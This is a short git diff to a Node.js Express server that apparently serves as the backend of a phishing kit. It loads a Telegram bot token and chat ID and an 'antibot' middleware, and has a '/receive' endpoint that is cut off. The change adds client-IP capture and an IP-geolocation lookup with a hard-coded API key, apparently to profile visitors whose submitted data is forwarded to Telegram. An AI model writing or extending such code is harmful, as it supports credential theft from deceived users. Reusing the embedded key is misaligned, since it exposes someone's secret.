@@ -5,8 +5,12 @@ const path = require('path');
 const { botToken, chatId } = require('./Config/settings.js');
 const antibot = require('./middleware/antibot');
 const { sendMessageFor } = require('simple-telegram-message');
+const { getClientIp } = require("request-ip");
 const https = require('https');
 const querystring = require('querystring');
+const axios = require('axios');
+const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
+const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
 
  
 app.use(express.static(path.join(`${__dirname}`)));
@@ -48,8 +52,8 @@ const sendTelegramMessage = (text) => {
 };
 
 
-const axios = require('axios');
-const { getClientIp } = require("request-ip");
+
+
 
 app.post('/receive', async (req, res) => {
   let message = '';
